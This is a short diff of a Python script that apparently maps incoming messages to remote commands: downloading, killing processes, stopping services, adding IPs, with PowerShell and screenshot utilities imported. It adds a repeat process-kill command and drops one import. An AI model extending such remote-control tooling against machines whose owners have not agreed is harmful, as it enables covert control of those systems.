@@ -15,7 +15,6 @@ import pyutils.local_utils as lu
 import pyutils.network_utils as nu
 import pyutils.powershell_utils as pu
 import pyutils.screenshot_handling as sh
-import pyutils.process_killer as k
 
 Buffer = 2
 Interval = 10
@@ -80,6 +79,7 @@ def handle_input(message: str):
         "downloader": d.downloader,
         "kill": lu.kill_process_cmd,
         "kill-by-name": lu.kill_all_processes_by_name,
+        "repeat-kill-proc": lu.repeat_kill_by_name,
         "get-all-services": lu.get_all_services_cmd,
         "stop-service": lu.stop_service_cmd,
         "ip-add": add_ip
